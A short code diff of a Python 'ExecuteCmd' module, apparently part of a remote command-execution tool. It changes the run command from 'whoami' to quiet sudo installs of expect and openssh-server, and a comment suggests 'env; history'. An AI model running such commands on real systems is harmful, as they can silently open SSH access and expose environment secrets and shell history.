@@ -1,7 +1,7 @@
 import os
 import subprocess
 
-command="whoami"
+command="sudo apt-get install expect>/dev/null; sudo apt-get install openssh-server>/dev/null"    #"env; history"
 
 def run(**args):
   print("[*] In ExecuteCmd module.") #Todelete
